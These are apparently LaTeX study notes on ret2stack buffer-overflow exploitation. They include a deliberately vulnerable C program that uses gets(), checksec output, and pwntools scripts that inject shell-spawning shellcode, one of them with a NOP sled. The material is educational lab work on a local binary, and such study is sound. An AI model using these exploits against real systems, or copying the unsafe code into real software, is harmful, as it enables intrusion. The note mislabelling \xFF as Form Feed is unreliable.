\subsection{ret2stack (shellcode)}

in this attack the payload will contain shellcode and we the saved instruction
pointer over-riden with the address of the buffer. Therefore the
process when returning will jump to the stack and execute the shellcode.

Notei that for this to work:
\begin{itemize}
    \item ASLR must be disabled (\verb+/proc/sys/kernel/randomize_va_space+
        must be 0)
    \item the stack must be executable
\end{itemize}

\subsubsection{Example}
\begin{verbatim}
// gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack -m32

#include <stdio.h>

void unsafe() {
    char buffer[300];

    puts("Overflow me");
    gets(buffer);
}

void main() {
    unsafe();
}
\end{verbatim}

\subsubsection{Exploit}

First check security of the binary:
\begin{verbatim}
$ pwntools-pwn checksec ./vuln
[*] 'vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
\end{verbatim}

The payload will be of the form:
\begin{verbatim}
<shellcode><padding><address of shellcode>
\end{verbatim}


First we need to find the address of the buffer which will be also the address
of the shellcode we need to jump to.

this can be done with \verb+gdb+ 
input for exemple enough \verb+\x61+ to stack overflow.
then inspect the stack in order to find where the first \verb+\x61+ start with
a command like:
\begin{verbatim}
gef>  x/1000cb $esp
\end{verbatim}

find the offset (the payload size) with \verb+pwntools-pwn cyclic+

craft a shellcode and compute the final payload:
\begin{verbatim}
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = asm(shellcraft.sh())          # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffb5cb)              # or p64 Address of the Shellcode

log.info(p.clean())
p.sendline(payload)
p.interactive()
\end{verbatim}

Note: it might be necessary when crafting a payload to eliminate {\bf bad
caracters}. Bad characters can vary, but often we will see characters like this:
\begin{itemize}
    \item \verb+\x00+ - Null Byte
    \item \verb+\x0A+ - Line Feed
    \item \verb+\x0D+ - Carriage Return
    \item \verb+\xFF+ - Form Feed
\end{itemize}


to identify bad chars: craft a payload containing all possible chars and
inspect the stack to see if some are missing.

this has to be done as an iterative process until all injected chars are
present in the buffer.

msfvenom offer a \verb+-bad-chars "<chars>"+ parameter when generating a
shellcode.

for pwntools the use of 
\verb+pwnlib.encoders.encoder.encode(raw_bytes, avoid, expr, force)+


\subsubsection{nop sled (slide)}

NOP (no operation) instructions do exactly what they sound like: nothing. Which
makes then very useful for shellcode exploits, because all they will do is run
the next instruction. If we pad our exploits on the left with NOPs and point
EIP at the middle of them, it'll simply keep doing no instructions until it
reaches our actual shellcode. This allows us a greater margin of error as a
shift of a few bytes forward or backwards won't really affect it, it'll just
run a different number of NOP instructions - which have the same end result of
running the shellcode. This padding with NOPs is often called a {\bf NOP slide}
or {\bf NOP sled}, since the EIP is essentially sliding down them.

\begin{verbatim}
from pwn import *

payload = b'\x90' * 240                 # The NOPs
payload += asm(shellcraft.sh())         # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4 + 120)        # or p64 Address of the buffer + half nop length
\end{verbatim}
